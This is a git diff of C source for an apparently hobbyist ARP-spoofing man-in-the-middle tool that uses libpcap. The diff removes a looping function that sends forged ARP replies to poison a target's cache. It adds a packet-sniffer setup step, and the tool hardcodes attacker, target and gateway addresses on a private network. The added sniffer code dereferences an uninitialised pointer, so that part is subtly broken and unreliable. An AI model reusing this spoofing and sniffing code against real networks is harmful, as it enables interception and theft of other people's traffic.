@@ -5,7 +5,7 @@
 #include"arp.h"
 #include"sniffer.h"
 #include"getif.h"
-
+#include"print.h"
 
 bool debug=false;
 void usage(){
@@ -15,39 +15,18 @@ void usage(){
 		"  -i = interface name\n"
 		"  -l = list all available interface\n");
 }
-void* arp_spoof(void* info){
-	MITM_info* m_info= (MITM_info*)info;
-	if(debug){
-		printf("======start arp spoof======\n");
-		printf("dev is %s\n",m_info->dev);
-		printf("target's IP is ");
-		print_ip(m_info->TARGET_IP);
-	}
-	int p_tag_target;
-       	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
-			m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
-	if(p_tag_target == -1){
-		if(debug)printf("======arp spoof fail,return======\n");
-		return NULL;
-	}
-	 while(1){
-		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
-				 m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
-		if(p_tag_target == -1)break;
-		usleep(1000000);
-	}
-	printf("======arp spoof fail,return======\n");
-	return NULL;
-}
 
 int main(int argc,char* argv[]){
 	int c ,exitcode;
+
 	u_char ATTACKER_MAC[6];
 	u_char TARGET_MAC[6]={0xd0,0xc5,0xd3,0x26,0x36,0x77};
 	u_char GATEWAY_MAC[6];
 	u_char ATTACKER_IP[4]={192,168,43,46};
 	u_char TARGET_IP[4]={192,168,43,127};
 	u_char GATEWAY_IP[4]={192,168,43,1};
+	
+	sni_info* dev_info;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_if_t* if_buf;
 	char* usr_dev;
@@ -98,6 +77,14 @@ int main(int argc,char* argv[]){
 		exitcode = 11;
 		goto out;
 	}
+
+	/* sniffer init */
+	dev_info->dev = usr_dev;
+	if(sniffer_init(dev_info,errbuf)){
+		exitcode = 10;
+		goto out;
+	}
+
 	getAttackerMAC(usr_dev,ATTACKER_MAC);
 	if(debug){
 		printf("the attacker MAC is ");
